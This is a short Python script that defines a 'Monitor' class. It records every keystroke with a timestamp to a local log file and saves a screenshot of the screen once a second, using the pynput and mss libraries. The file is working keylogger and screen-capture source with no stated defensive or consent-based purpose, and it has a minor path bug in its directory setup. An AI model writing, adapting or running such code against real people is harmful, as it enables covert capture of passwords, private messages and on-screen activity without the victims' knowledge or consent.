from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import os
import time


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:
    def _on_press(self, k):
        with open('./logs/keylogs/logs.txt', 'a') as f:
            f.write('{}\t{}\t'.format(k, time.time()))

    def _buildlogs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('/logs/keylogs')
            os.mkdir('./logs/screenshots')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screeenshots(self):
        sc = mss()
        sc.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def run(self, interval=1):
        self._buildlogs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screeenshots).start()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()
